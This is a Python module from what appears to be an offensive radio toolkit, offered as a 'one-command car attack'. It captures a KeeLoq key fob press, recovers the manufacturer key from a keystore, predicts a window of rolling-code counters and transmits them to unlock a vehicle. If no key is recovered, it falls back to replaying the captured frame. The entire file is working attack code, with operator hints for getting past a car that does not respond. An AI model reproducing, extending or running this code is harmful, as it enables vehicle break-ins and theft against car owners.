"""One-command car attack: capture, identify, predict and inject.

The existing modules are staged: `car.sweep` writes files, `car.replay` plays
them slowly, `car.inject` needs a capture already on disk. This ties the chain
together so a single invocation goes from an empty keystore to a fired
counter-window, and reports exactly which stage failed when it does not work.

Order matters and is enforced: without a keystore the counter cannot advance,
so the module refuses early instead of spraying a frozen frame.
"""

from __future__ import annotations

import os
import time

from omni.car import analysis
from omni.car.modules._base import CarModule
from omni.core import config, console
from omni.core.module import Option
from omni.rf import marquee
from omni.rf.subfile import SubFile

__all__ = ["Unlock"]


class Unlock(CarModule):
    NAME = "car.unlock"
    DESCRIPTION = "Capture a fob press, predict counters and fire them at the car"
    OPTIONS = (Option("SUB", "pre-captured .sub (blank = capture live)"),
               Option("SECONDS", "capture window when SUB is blank", "20"),
               Option("BRAND", "brand hint for the profile match"),
               Option("WINDOW", "counters to try after the capture", "64"),
               Option("STEP", "stride between counters", "1"),
               Option("COPIES", "copies per counter", "1"),
               Option("GAP", "extra dead air, ms", "0"),
               Option("KEYSTORE", "manufacturer keystore path"))

    def _capture(self, freq: int, preset) -> SubFile | None:
        """Listen for a live press and return it as a KeeLoq .sub."""
        rig = self.rig()
        found: list = []
        rx = rig.rx()
        try:
            rx.on_found(lambda r: found.append(r))
            rx.start(preset, freq)
            console.info(f"listening on {freq / 1e6:.3f} MHz — press the fob")
            deadline = time.time() + max(1, self.get_int("SECONDS", 20))
            while time.time() < deadline and not found:
                time.sleep(0.2)
            rx.stop()
        finally:
            rig.close()
        if not found:
            return None
        result = found[-1]
        sub = SubFile()
        sub.protocol = result.protocol_name
        sub.bit = result.data_count_bit
        sub.te = int(result.te or 400)
        sub.frequency = freq
        sub.preset_name = preset.name
        sub.key = result.data
        sub.guard_time = 30
        console.ok(f"captured {result.protocol_name} 0x{result.data:X}")
        return sub

    def execute(self) -> dict:
        store = self.keystore(self.get("KEYSTORE") or None)
        if len(store) == 0:
            raise RuntimeError("empty keystore — without a manufacturer key the "
                               "counter cannot advance (see assets/keeloq_keys.txt)")

        if self.get("SUB"):
            sub = self.load_sub()
        else:
            from omni.rf.presets import preset_by_name
            preset = preset_by_name(str(config.get_value(
                "rf.default_preset", "AM650")))
            freq = int(config.get_value("rf.default_frequency", 433_920_000))
            sub = self._capture(freq, preset)
            if sub is None:
                console.warn("nothing captured — move closer and retry")
                return {"captured": False, "sent": 0}

        if sub.protocol != "KeeLoq":
            raise ValueError(f"not a rolling-code capture: {sub.protocol!r} — "
                             "use car.replay for fixed codes")

        report = analysis.analyze_sub(sub, store, [self.get("BRAND")]
                                      if self.get("BRAND") else None)
        console.kv([("verdict", report.get("verdict", "")),
                    ("button", f"0x{report.get('button', 0):X}")])
        if not report.get("manufacturer"):
            console.warn("manufacturer key not recovered — trying the capture "
                         "verbatim first, then the sweep is skipped")
            rig = self.rig()
            try:
                sent = rig.tx().send_subfile(sub)
            finally:
                rig.close()
            return {"manufacturer": None, "sent": sent,
                    "verdict": report.get("verdict")}

        sub.manufacture = report["manufacturer"]
        sub.seed = report.get("seed") or 0
        console.ok(f"key: {report['manufacturer']} — counter 0x"
                   f"{report.get('counter', 0):04X}")

        window = max(1, self.get_int("WINDOW", 64))
        subs, counters = analysis.sweep(sub, store, count=window,
                                        step=self.get_int("STEP", 1))
        frames = [f[0] for f in (marquee.frames_from_sub(s) for s in subs) if f]
        slots = marquee.plan(frames, "capture", self.get_int("COPIES", 1))
        gap = marquee.clamp_gap(self.get_int("GAP", 0))
        budget = marquee.timing(slots, gap)
        console.info(f"firing 0x{counters[0]:04X}..0x{counters[-1]:04X} "
                     f"({budget['total_ms'] / 1000:.1f}s)")

        flat = marquee.to_sub(slots, gap)
        rig = self.rig()
        try:
            sent = rig.tx().send_subfile(flat)
        finally:
            rig.close()
        console.ok(f"{sent} train(s) sent — if the car still sleeps, widen "
                   "WINDOW or raise STEP")
        return {"manufacturer": report["manufacturer"], "sent": sent,
                "counters": len(counters), "air_ms": budget["total_ms"],
                "demo": rig.demo}
